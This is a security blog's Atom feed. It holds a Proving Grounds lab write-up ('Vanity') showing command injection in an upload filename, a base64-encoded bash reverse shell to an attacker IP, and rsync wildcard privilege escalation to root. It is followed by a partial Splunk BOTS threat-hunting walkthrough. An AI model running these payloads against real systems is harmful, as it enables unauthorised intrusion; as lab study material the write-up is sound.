<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2024-03-25T20:26:16+11:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">Vanity - OSPG</title><link href="https://jayngng.github.io/blog/vanity-ospg/" rel="alternate" type="text/html" title="Vanity - OSPG" /><published>2023-09-02T05:47:34+10:00</published><updated>2023-09-02T05:47:34+10:00</updated><id>https://jayngng.github.io/blog/vanity---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/vanity-ospg/">&lt;h1 id=&quot;0-lab-information&quot;&gt;0. Lab Information&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;Machine Name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vanity&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Platform: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Proving Grounds Practice&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Difficulty: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intermediate&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;1-summary&quot;&gt;1. Summary&lt;/h1&gt;
&lt;p&gt;The target web server was vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command injection&lt;/code&gt; vulnerability. Leveraging the weakness, I secured an initial access on the target as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user. Locally examine the system, there was a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cron&lt;/code&gt; job, which could be exploited to obtain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;
&lt;h1 id=&quot;2-detailed-writeup&quot;&gt;2. Detailed Writeup&lt;/h1&gt;
&lt;h2 id=&quot;21-service-enumeration&quot;&gt;2.1 Service Enumeration&lt;/h2&gt;
&lt;p&gt;Per enumerating running service using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, I detected 3 active services.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -Pn -T4 -oA nmap/full_ports -p- -vv 192.168.x.234&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/1.png&quot; title=&quot;vanity/1.png&quot; alt=&quot;vanity/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Let’s us drop our attention to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service running on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;22-http-recon&quot;&gt;2.2 HTTP Recon&lt;/h2&gt;

&lt;p&gt;Navigated to the web server, the file upload feature instantly caught my attention.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/2.png&quot; title=&quot;vanity/2.png&quot; alt=&quot;vanity/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Prior exploring this feature, I started a directory scanner using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;. The command is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf -u http://192.168.228.234/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -of md -o common.md&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let it run in the background, the below table is a summary of my scanning’s results.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;FUZZ&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;URL&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Redirectlocation&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Position&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Status Code&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Content Length&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Content Words&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Content Lines&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Content Type&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Duration&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ResultFile&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ScraperData&lt;/th&gt;
      &lt;th&gt;Ffufhash&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.htpasswd&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/.htpasswd&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;25&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;403&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;280&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;text/html; charset=iso-8859-1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;251.493179ms&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;370e119&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.htaccess&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/.htaccess&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;24&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;403&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;280&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;text/html; charset=iso-8859-1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;258.235462ms&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;370e118&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.hta&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/.hta&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;23&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;403&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;280&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;text/html; charset=iso-8859-1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3.640424528s&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;370e117&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;index.html&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/index.html&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2201&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;200&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2814&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;344&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;73&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;text/html&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;272.484081ms&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;370e1899&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;server-status&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/server-status&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3723&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;403&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;280&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;text/html; charset=iso-8859-1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;272.49353ms&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;370e1e8b&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;uploads&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/uploads&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http://192.168.228.234/uploads/&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4326&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;301&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;320&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;text/html; charset=iso-8859-1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;254.406676ms&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;370e110e6&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Back to the web server, I created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; file and uploaded onto the target system.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;test.txt           
Test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OK&lt;/code&gt;, meaning that the file had been successfully uploaded.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/3.png&quot; title=&quot;vanity/3.png&quot; alt=&quot;vanity/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Went back one directory, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/uploads&lt;/code&gt;, I found that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; file was saved in there.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/4.png&quot; title=&quot;vanity/4.png&quot; alt=&quot;vanity/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Intercept the request with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;, this is how the request would look like.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/5.png&quot; title=&quot;vanity/5.png&quot; alt=&quot;vanity/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Based on the logic, this could potentially cause a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote Code Execution&lt;/code&gt; vulnerability.&lt;/p&gt;

&lt;p&gt;However, the server did a good job in filtering malicious file extensions.Trying various bypassing methods wouldn’t return any results.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/6.png&quot; title=&quot;vanity/6.png&quot; alt=&quot;vanity/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;At this point, I approached it with different perspectives, attempting to exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; or overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; file, none of them worked out.&lt;/p&gt;

&lt;p&gt;This was when I started noticing the scanning result.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/7.png&quot; title=&quot;vanity/7.png&quot; alt=&quot;vanity/7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Researching the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCAN SUMMARY&lt;/code&gt; outputs revealed the fact that this website processed my file using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clamav&lt;/code&gt;. That said, every request sent, if successful, would take around ~12,000 millis.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/8.png&quot; title=&quot;vanity/8.png&quot; alt=&quot;vanity/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Next, I tried out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command injection&lt;/code&gt; vulnerability by injecting a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep 5&lt;/code&gt; command in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename&lt;/code&gt; field.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/9.png&quot; title=&quot;vanity/9.png&quot; alt=&quot;vanity/9.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It took ~17,000 millis to complete the request, which confirmed that the injected code was, indeed, executed.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/10.png&quot; title=&quot;vanity/10.png&quot; alt=&quot;vanity/10.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;To obtain reverse shell, I encoded my reverse shell in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; and execute it. The payload will look like below:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# YmF... = bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.45.169/80 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2OS84MCAwPiYxJwo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; | sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/11.png&quot; title=&quot;vanity/11.png&quot; alt=&quot;vanity/11.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;After a few seconds, I got a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/12.png&quot; title=&quot;vanity/12.png&quot; alt=&quot;vanity/12.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;As the current shell was not stable, I stabilized it as the following:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/13.png&quot; title=&quot;vanity/13.png&quot; alt=&quot;vanity/13.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Once done, I changed directory to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; and read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/14.png&quot; title=&quot;vanity/14.png&quot; alt=&quot;vanity/14.png&quot; /&gt;
          &lt;/div&gt;

&lt;h2 id=&quot;23-local-enumeration&quot;&gt;2.3 Local Enumeration&lt;/h2&gt;
&lt;p&gt;Checking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab&lt;/code&gt; file, looks like that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup.sh&lt;/code&gt; script got executed every minute.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/15.png&quot; title=&quot;vanity/15.png&quot; alt=&quot;vanity/15.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Read the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.sh&lt;/code&gt; file, it introduced a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; wildcard vulnerability.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/16.png&quot; title=&quot;vanity/16.png&quot; alt=&quot;vanity/16.png&quot; /&gt;
          &lt;/div&gt;

&lt;h2 id=&quot;24-privilege-escalation&quot;&gt;2.4 Privilege Escalation&lt;/h2&gt;

&lt;p&gt;To exploit the vulnerability, I created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; script containing a bash reverse shell. To trigger the shell, I implanted an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag pointing to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/17.png&quot; title=&quot;vanity/17.png&quot; alt=&quot;vanity/17.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;In the background, it’ll look something similar to:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;rsync&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vanity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a minute, my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; handler got a call back as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/18.png&quot; title=&quot;vanity/18.png&quot; alt=&quot;vanity/18.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; shell, I successfully read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/vanity/19.png&quot; title=&quot;vanity/19.png&quot; alt=&quot;vanity/19.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="ospg" /><category term="red" /><category term="linux" /><summary type="html">0. Lab Information Machine Name: Vanity Platform: Proving Grounds Practice Difficulty: Intermediate</summary></entry><entry><title type="html">Boss Of The SOC (BOTS) v1 - Threat Hunting with Splunk (II)</title><link href="https://jayngng.github.io/blog/boss-of-the-soc-bots-v1-threat-hunting-with-splunk-ii/" rel="alternate" type="text/html" title="Boss Of The SOC (BOTS) v1 - Threat Hunting with Splunk (II)" /><published>2023-08-25T21:05:55+10:00</published><updated>2023-08-25T21:05:55+10:00</updated><id>https://jayngng.github.io/blog/boss-of-the-soc-bots-v1---threat-hunting-with-splunk-ii</id><content type="html" xml:base="https://jayngng.github.io/blog/boss-of-the-soc-bots-v1-threat-hunting-with-splunk-ii/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;The lab is provided by INE - Effectively Using Splunk (S1).&lt;/li&gt;
  &lt;li&gt;Another very good &amp;amp; free lab: &lt;a href=&quot;https://samsclass.info/50/proj/botsv1.htm&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Continuing of &lt;a href=&quot;https://jayngng.github.io/blog/boss-of-the-soc-bots-v1-events-analysis-with-splunk-i/&quot;&gt;Boss Of The SOC (BOTS) v1 - Threat Hunting with Splunk (I)&lt;/a&gt; …&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-4---exploitation-activities&quot;&gt;&lt;strong&gt;Step 4 - Exploitation Activities&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this phase, we’ll employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Splunk&lt;/code&gt; to uncover any exploitation activity on the network. Let’s us focus on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream:http&lt;/code&gt; sourcetype. The query is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 sourcetype=&quot;stream:http&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Considering the following image:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/19.png&quot; title=&quot;botsv1/19.png&quot; alt=&quot;botsv1/19.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http_method&lt;/code&gt; section in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTERESTING FIELDS&lt;/code&gt; column, it’s obvious that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; requests account for a large portion of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; requests.&lt;/p&gt;

&lt;p&gt;We are also interested in the requests being sent to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.250.70&lt;/code&gt;, which is our organization website. The search we use is as the following.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; http_method=&quot;POST&quot; dest=&quot;192.168.250.70&quot; NOT &quot;Acunetix&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NOT &quot;Acunetix&quot;&lt;/code&gt; is specified to exclude &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Acunetix&lt;/code&gt; scanner requests.&lt;/p&gt;

&lt;p&gt;Applying the search, the result is much cleaner. Let’s look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http_user_agent&lt;/code&gt; field.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/20.png&quot; title=&quot;botsv1/20.png&quot; alt=&quot;botsv1/20.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We discovered that the agent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python-urllib/2.7&lt;/code&gt; is used, let’s also include it in our search.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; http_method=&quot;POST&quot; dest=&quot;192.168.250.70&quot; NOT &quot;Acunetix&quot; http_user_agent=&quot;Python*&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/21.png&quot; title=&quot;botsv1/21.png&quot; alt=&quot;botsv1/21.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Scroll down a little bit, we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;form_data&lt;/code&gt; contains values of &lt;strong&gt;username&lt;/strong&gt; and &lt;strong&gt;password&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Considering the below query:&lt;/p&gt;
&lt;ul&gt;
